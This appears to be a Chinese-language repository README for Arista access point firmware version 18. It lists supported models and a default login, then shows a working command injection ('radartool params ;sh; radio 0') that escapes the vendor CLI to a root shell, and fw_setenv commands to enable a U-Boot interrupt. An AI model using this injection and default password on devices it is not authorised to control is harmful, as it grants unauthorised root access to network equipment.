# Arista AP firmware
AP固件为18版本，带提权漏洞。可设置uboot中断。</br>
AP默认账户密码：`config`</br>
提权命令：`radartool params ;sh; radio 0`</br>
设置uboot中断（示例中用的`n`）</br>

## 固件涵盖AP型号：
| AP型号   | 测试支持 |
| ------- | :-----: | 
| C-200  |         | 
| C-230  |         | 
| C-250  |         | 
| C-260  |   ✅    | 
| C-330  |         | 
| C-360  |   ✅    | 
| O-235  |         | 
| W-318  |         | 

## AP原厂系统登陆示例：
```
(none) login: config
Password: 
Welcome to the AP CLI.
----------------------------
Type 'help' to list available commands.
[config]$ 
[config]$ 
```
## AP原厂系统版本查看命令：
```
[config]$ show device info 
Device Model   :  
Device MAC     : 
Serial Number  : 
Platform Sub ID:       
Device Version : 1X
Device Build   : 
SDK Version    :    
Radio Power    : 
```

## AP原厂固件升级示例：
```
[config]$ upgrade url https://github.com/nblky/Arista-AP-firmware/tree/main/18/C-200
Upgrade from Server/Host [https://github.com/nblky/Arista-AP-firmware/tree/main/18/C-200]
Continue? [y]/n: y
Upgrade has started. You can check upgrade progress using 'show log upgrade' command


#固件升级会自己重启AP，耐心等待。
[2026-05-23 19:49:51] Upgrade completed. Going for Reboot.
[  260.701651] reboot: Restarting system
```
## AP原厂系统提权和设置uboot中断示例：
```
[config]$ 
[config]$ radartool params ;sh; radio 0
Radar;
Use NOL: no
Firpwr (thresh to see if radar sig is gone):  0
Radar Rssi (thresh to start radar det in dB): 0
Height (thresh for pulse height (dB):         0
Pulse rssi (thresh if pulse is gone in dB):   0
Inband (thresh if pulse is inband (in 0.5dB): 0
Relative power check disabled
Relative step for pulse detection disabled
Max length of radar sig in 0.8us units: 0


BusyBox v1.35.0 (2024-12-20 06:42:46 UTC) built-in shell (ash)


~ # 
~ # su


BusyBox v1.35.0 (2024-12-20 06:42:46 UTC) built-in shell (ash)


~ # 
~ # fw_setenv bootdelaykey n
~ # fw_setenv bootstopkey n
~ # fw_setenv bootdelay 6
~ # reboot
```
## AP通电启动进入uboot示例：
<img width="1024" height="388" alt="Code 2026-06-09 06 34 52" src="https://github.com/user-attachments/assets/07054bd6-157c-4b19-9cc2-3a77aba87297" />
